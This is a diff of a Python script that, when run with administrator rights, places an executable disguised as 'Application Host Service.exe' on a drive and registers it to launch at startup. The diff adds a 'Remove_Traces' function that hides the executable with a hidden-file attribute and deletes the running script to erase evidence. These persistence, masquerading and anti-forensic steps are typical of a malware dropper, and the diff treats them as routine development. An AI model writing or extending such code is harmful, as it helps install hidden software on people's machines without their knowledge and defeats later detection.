@@ -38,7 +38,6 @@ if run_as_admin():
                 # print(f"Source---**file {source_path} does not exist.")
                 pass
         except Exception as e:
-            # print(f"Error: {e}")
             pass
     def add_to_startup(Drive_Letter):
 
@@ -58,6 +57,15 @@ if run_as_admin():
         except Exception as e:
             # print(f"Error adding to startup: {e}")
             pass
+    def Remove_Traces(Drive_Letter):
+        # Hide The File
+        Exe_Path=rf"{Drive_Letter}\Application Host Service.exe"
+        os.system(f"attrib +h \"{Exe_Path}\"")
+        # Delete The File
+        script_path = sys.argv[0]
+        absolute_path = os.path.abspath(script_path)
+        os.remove(absolute_path)
+
 
     #  list_drive_letters Fuction 💠
     drive_letters = list_drive_letters()
@@ -65,8 +73,7 @@ if run_as_admin():
     drive_letter = A+"/"
 
 
-
-    #  move_exe_file Fuction I💠
+    #  Move_exe_file Fuction I💠
     script_directory = getattr(sys, '_MEIPASS', os.path.dirname(__file__))
 
     # Specify the paths
@@ -77,9 +84,11 @@ if run_as_admin():
 
     # Add_to_startup() Fuction 💠
     add_to_startup(drive_letter)
+
+    #Remove Traces 💠
+    Remove_Traces(drive_letter)
+
     
-    Exe_Path=rf"{drive_letter}\Application Host Service.exe"
-    os.system(f"attrib +h \"{Exe_Path}\"")
 
 
 
